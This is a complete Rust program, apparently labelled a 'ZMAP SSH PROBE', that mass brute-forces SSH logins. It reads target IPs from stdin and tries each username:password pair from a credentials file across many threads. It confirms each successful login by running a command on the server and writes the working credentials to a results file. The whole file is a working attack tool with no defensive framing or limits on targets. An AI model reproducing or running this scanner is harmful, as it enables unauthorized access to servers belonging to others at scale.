use ssh2::Session;
use std::io::{self, BufRead, Write, BufWriter};
use std::fs::OpenOptions;
use std::net;
use std::sync::mpsc;
use std::time::Duration;
use std::sync::atomic::{AtomicUsize, Ordering};
use colored::*; 
use clap::Parser;
use std::io::Read;
use std::thread;
use std::sync::{Arc, Mutex};

static IMPORTED: AtomicUsize = AtomicUsize::new(0);
static CHECKED: AtomicUsize = AtomicUsize::new(0);
static COMBOS_CHECKED: AtomicUsize = AtomicUsize::new(0);
static SUCCESS: AtomicUsize = AtomicUsize::new(0);
static FAILED: AtomicUsize = AtomicUsize::new(0);
static TIMEOUTS: AtomicUsize = AtomicUsize::new(0);

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Specifies the SSH port
    #[arg(short = 'p', long, default_value = "22")]
    port: u16,

    /// Specifies the name of the output file
    #[arg(short = 'o', long, default_value = "results.txt")]
    output_file: String,

    /// Specifies the number of threads to use
    #[arg(short = 't', long, default_value = "50")]
    threads: usize,
}

fn main() {
    let args = Args::parse();

    let (ip_tx, ip_rx) = mpsc::channel();
    let ip_rx = Arc::new(Mutex::new(ip_rx));
       
    thread::spawn(|| {
        println!("+-------------------------------------------+");
        println!("|             ZMAP SSH PROBE                |");
        println!("+-------------------------------------------+");
        
        loop {
            thread::sleep(Duration::new(1, 0)); // Sleep for one second

            // Read the atomic values
            let imported_count = IMPORTED.load(Ordering::Relaxed);
            let checked_count = CHECKED.load(Ordering::Relaxed);
            let combos_checked_count = COMBOS_CHECKED.load(Ordering::Relaxed);
            let success_count = SUCCESS.load(Ordering::Relaxed);
            let failed_count = FAILED.load(Ordering::Relaxed);
            let timeouts_count = TIMEOUTS.load(Ordering::Relaxed);

            print!("IPs Imported: {} | IPs Checked: {} | Combos Checked: {} | Successful: {} | Failed: {} | Timeouts: {} \n", 
                imported_count.to_string().blue(),
                checked_count.to_string().blue(),
                combos_checked_count.to_string().yellow(), 
                success_count.to_string().green(),
                failed_count.to_string().red(),
                timeouts_count.to_string().magenta()
            );

            io::stdout().flush().unwrap();
        }
    });

    thread::spawn(move || {
        let stdin = io::stdin();
        for line in stdin.lock().lines() {
            let ip = line.expect("Failed to read line");
            ip_tx.send(ip).unwrap();
            IMPORTED.fetch_add(1, Ordering::Relaxed);
        }
    });

    let credentials = load_credentials_file("credentials.txt");
    const STACK_SIZE: usize = 8 * 1024 * 1024; // 8MB

    let handles: Vec<_> = (0..args.threads).map(|_| {
        let ip_rx = Arc::clone(&ip_rx);
        let creds = credentials.clone();
        let output_file = args.output_file.clone();
    
        std::thread::Builder::new().stack_size(STACK_SIZE).spawn(move || {
            loop {
                let ip;
                {
                    let receiver = ip_rx.lock().unwrap();
                    ip = receiver.recv();
                }
    
                match ip {
                    Ok(ip) => check_ssh_login(ip, args.port, creds.clone(), &output_file),
                    Err(_) => break, // Break loop when no more IPs
                }
            }
        }).unwrap()
    }).collect();

    // Wait for all threads to finish
    for handle in handles {
        handle.join().unwrap();
    }
}

fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, output_file: &str) {
    let timeout = 5_000; // milliseconds
    CHECKED.fetch_add(1, Ordering::Relaxed);

    let tcp_stream_result = net::TcpStream::connect((ip.as_str(), port));

    match tcp_stream_result {
        Ok(tcp_stream) => {
            let mut session = match Session::new() {
                Ok(session) => session,
                Err(_) => {
                    FAILED.fetch_add(1, Ordering::Relaxed);
                    return;
                }
            };

            session.set_tcp_stream(tcp_stream);
            session.set_timeout(timeout);

            if session.handshake().is_err() {
                FAILED.fetch_add(1, Ordering::Relaxed);
                return;
            }

            for (username, password) in &credentials {
                COMBOS_CHECKED.fetch_add(1, Ordering::Relaxed);

                if session.userauth_password(username, password).is_ok() {
                    let mut channel = match session.channel_session() {
                        Ok(channel) => channel,
                        Err(_) => {
                            FAILED.fetch_add(1, Ordering::Relaxed);
                            continue;
                        }
                    };

                    if channel.exec("echo '.'").is_err() {
                        FAILED.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }

                    // Read any potential output from the command
                    let mut output = String::new();
                    if let Err(_e) = channel.read_to_string(&mut output) {
                        //println!! ("Error reading output for IP {} with username {}: {}", ip, username, e);
                    }

                    // Send EOF if needed
                    channel.send_eof().unwrap_or_default();

                    // Now, try to close the channel
                    if let Err(_e) = channel.wait_close() {
                        //println!! ("Channel close error for IP {} with username {}: {}", ip, username, e);
                        FAILED.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }

                    if channel.exit_status().unwrap_or(-1) == 0 {
                        session.disconnect(None, "Closing session", None).unwrap_or_default();
                        write_successful_login_to_file(output_file, &ip, username, password);
                        SUCCESS.fetch_add(1, Ordering::Relaxed);
                        break;
                    } else {
                        FAILED.fetch_add(1, Ordering::Relaxed);
                    }
                } else {
                    FAILED.fetch_add(1, Ordering::Relaxed);
                }
            }
        },
        Err(e) => {
            if e.to_string().contains("timeout") {
                TIMEOUTS.fetch_add(1, Ordering::Relaxed);
            } else {
                FAILED.fetch_add(1, Ordering::Relaxed);
            }
        }
    }
}



fn load_credentials_file(file_path: &str) -> Vec<(String, String)> {
    let file = std::fs::File::open(file_path).expect("Unable to open credentials file");
    let reader = std::io::BufReader::new(file);

    reader.lines().filter_map(|line| {
        let line = line.expect("Failed to read line from credentials file");
        let parts: Vec<&str> = line.split(':').collect();
        if parts.len() == 2 {
            Some((parts[0].to_string(), parts[1].to_string()))
        } else {
            None
        }
    }).collect()
}

fn write_successful_login_to_file(output_file: &str, ip: &str, username: &str, password: &str) {
    let file = OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open(output_file)
        .unwrap();
    let mut file = BufWriter::new(file);
    
    writeln!(file, "{}:{}@{}", username, password, ip).unwrap();
    file.flush().unwrap();
}
